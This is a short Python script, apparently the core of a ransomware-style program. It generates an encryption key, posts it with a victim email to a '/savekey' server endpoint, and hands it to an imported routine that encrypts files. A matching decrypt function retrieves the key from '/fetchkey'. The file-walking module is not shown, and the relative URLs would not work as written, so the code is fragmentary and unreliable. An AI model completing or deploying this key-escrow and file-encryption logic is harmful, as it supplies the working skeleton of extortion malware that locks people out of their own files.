#!/usr/bin/env python

import base64
import encryption_decryption as enc_dec
import requests


def encrypt(email):
	key = enc_dec.generateEncryptionKey(16)

	print(key)
	b64Key = base64.b64encode(key)

	stringB64 = b64Key.decode()
	#print(stringB64)
	#d = base64.b64decode(stringB64)

	#send to server
	requests.post("/savekey", json = {'email' : email, 'privatekey' : stringB64})
	#print(r.status_code)

	enc_dec.beginFileModification(key, enc_dec.encrypt)
	#update loading bar?
	


def decrypt(email):
	print("decrypting")


	r = requests.post("/fetchkey", json = {'email' : email})
	stringKey = r.text

	key = base64.b64decode(stringKey)
	
	enc_dec.beginFileModification(key, enc_dec.decrypt)
	print(key)
	#fetch key from server
	#proceed with decryption



if __name__ == '__main__':
	#test propogation and retrieval of key
	encrypt("rayan123@gmail.com")
	decrypt("rayan123@gmail.com")
